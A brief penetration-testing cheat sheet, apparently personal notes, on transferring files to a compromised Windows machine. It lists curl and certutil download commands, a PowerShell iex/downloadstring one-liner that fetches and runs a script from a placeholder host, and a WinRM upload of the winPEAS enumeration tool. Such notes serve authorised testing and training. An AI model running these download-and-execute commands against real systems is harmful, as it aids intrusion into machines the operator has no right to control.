Transferring files to the compromised windows machine:

- `curl -o <filename> http://<server>`
- `certutil.exe -urlcache -f http://<IP ADDRRESS>/<file name> <file name>`
- `iex(new-object net.webclient).downloadstring('http://<IP>/<filename>')`

Using winrm
`upload <full path to local file> <full path to destination>` for example `upload /home/kali/tools/winpeas.exe C:\\users\\tadi\\winpeas.exe`